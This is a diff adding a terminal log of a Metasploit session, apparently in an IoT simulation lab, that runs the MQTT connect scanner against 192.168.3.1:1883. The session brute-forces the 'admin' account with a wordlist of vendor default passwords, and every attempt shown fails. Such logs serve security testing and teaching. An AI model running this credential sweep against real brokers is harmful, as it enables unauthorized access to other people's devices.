@@ -1,0 +1,121 @@
+KVM is set to True
+
+iotsim-metasploit-1 console is now available... Press RETURN to get started.
+Metasploit tip: Set the current module's RHOSTS with database values 
+using hosts -R or services -R
+[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\[*] Starting the MetasplOit Framework console...|[*] Starting the MetasploIt Framework console.../[*] Starting the MetasploiT Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit framework console...|[*] Starting the Metasploit FRamework console.../[*] Starting the Metasploit FrAmework console...-[*] Starting the Metasploit FraMework console...\[*] Starting the Metasploit FramEwork console...|[*] Starting the Metasploit FrameWork console.../[*] Starting the Metasploit FramewOrk console...-[*] Starting the Metasploit FramewoRk console...\[*] Starting the Metasploit FrameworK console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework Console...-[*] Starting the Metasploit Framework cOnsole...\[*] Starting the Metasploit Framework coNsole...|[*] Starting the Metasploit Framework conSole.../[*] Starting the Metasploit Framework consOle...-[*] Starting the Metasploit Framework consoLe...\[*] Starting the Metasploit Framework consolE...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../                                                  
+[0m[36m[37mCall trans opt: received. 2-19-98 13:24:18 REC:Loc
+
+     Trace program: running
+
+           wake up, Neo...
+        [1mthe matrix has you[0m
+      follow the white rabbit.
+
+          knock, knock, Neo.
+
+                        (`.         ,-,
+                        ` `.    ,;' /
+                         `.  ,'/ .'
+                          `. X /.'
+                .-;--''--.._` ` (
+              .'            /   `
+             ,           ` '   Q '
+             ,         ,   `._    \
+          ,.|         '     `-.;_'
+          :  . `  ;    `  ` --,.._;
+           ' `    ,   )   .'
+              `._ ,  '   /_
+                 ; ,''-,;' ``-
+                  ``-..__``--`
+
+                             https://metasploit.com[0m
+[0m
+
+       =[ [33mmetasploit v6.5.11-dev[0m                                ]
++ -- --=[ 2,724 exploits - 1,373 auxiliary - 2,651 payloads     ]
++ -- --=[ 436 post - 57 encoders - 14 nops - 13 evasion         ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+[1m[34m[*][0m Processing docker/msfconsole.rc for ERB directives.
+[1m[34m[*][0m resource (docker/msfconsole.rc)> Ruby Code (236 bytes)
+[0mLHOST => 127.0.1.1
+stty: standard input
+[?1034h[4mmsf[0m [0m> use auxiliary/scanner/mqtt/connect
+[0m[4mmsf[0m auxiliary([1m[31mscanner/mqtt/connect[0m) [0m> 
+set rhosts 192.168.3.1
+[0mrhosts => 192.168.3.1
+[4mmsf[0m auxiliary([1m[31mscanner/mqtt/connect[0m) [0m> 
+set rport 1883
+[0mrport => 1883
+[4mmsf[0m auxiliary([1m[31mscanner/mqtt/connect[0m) [0m> 
+set username admin
+[0musername => admin
+[4mmsf[0m auxiliary([1m[31mscanner/mqtt/connect[0m) [0m> 
+set PASS_FILE data/wordlists/default_pass_ for_services_unhash.txt
+[0mPASS_FILE => data/wordlists/default_pass_for_services_unhash.txt
+[4mmsf[0m auxiliary([1m[31mscanner/mqtt/connect[0m) [0m> 
+set USER_FILE ""
+[0mUSER_FILE => 
+[4mmsf[0m auxiliary([1m[31mscanner/mqtt/connect[0m) [0m> 
+exploit
+[0m[1m[34m[*][0m 192.168.3.1:1883      - Testing without credentials
+[1m[34m[*][0m 192.168.3.1:1883      - Starting MQTT login sweep
+[1m[33m[!][0m 192.168.3.1:1883      - No active DB -- Credential data will not be saved!
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/admin (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/admin (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/ (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/password (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/1234 (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/epicrouter (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/sysadm (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/access (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/root (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/tech (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/smcadmin (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/0 (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/pass (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/system (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/PASSWORD (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/Symbol (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/guest (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/bintec (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/security (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/synnet (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/manager (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/adtran (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/motorola (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/smile (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/cascade (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/BRIDGE (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/netman (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/super (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/switch (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/setup (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/changeme (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/operator (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/user (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/Cisco (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/Manager (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/TJM (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/apc (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/cisco (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/letmein (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/router (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/trancell (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/ascend (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/friend (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/NetICs (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/blender (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/netscreen (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/SKY_FOX (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/public (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/Master (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/default (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/laflaf (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/cmaker (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/RSX (Failed Connection (5))
+[1m[31m[-][0m 192.168.3.1:1883      - MQTT LOGIN FAILED: admin/Posterie (Failed Connection (5))
+
